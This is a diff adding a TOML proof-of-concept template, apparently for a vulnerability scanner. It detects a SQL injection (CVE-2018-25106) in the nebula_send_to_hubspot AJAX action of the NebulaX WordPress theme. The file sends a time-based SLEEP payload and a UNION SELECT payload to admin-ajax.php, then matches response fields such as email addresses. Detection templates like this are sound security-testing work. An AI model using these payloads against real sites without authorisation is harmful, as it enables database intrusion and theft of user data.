@@ -1,0 +1,41 @@
+[info]
+id = "POC-AVE-2018-0035"
+name = "webuidesigning NebulaX Theme Legacy.php nebula_send_to_hubspot SQL 注入 PoC"
+author = "AVE"
+severity = "medium"
+tags = ["sql-injection", "wordpress", "cve-2018-25106"]
+description = "检测 webuidesigning NebulaX WordPress 主题（≤ 5.0）中 libs/Legacy/Legacy.php 的 nebula_send_to_hubspot 函数是否存在 SQL 注入漏洞，通过 nebula_id 参数注入恶意的 SQL 语句"
+vuln_id = ["CVE-2018-25106", "AVE-2018-0035"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-admin/admin-ajax.php"
+body.type = "form"
+body.action = "nebula_send_to_hubspot"
+body.nebula_id = "' OR SLEEP(3)-- -"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-admin/admin-ajax.php"
+body.type = "form"
+body.action = "nebula_send_to_hubspot"
+body.nebula_id = "1' AND 1=2 UNION SELECT 1,2-- -"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["hubspot_vid", "email_address"]
+expect = true
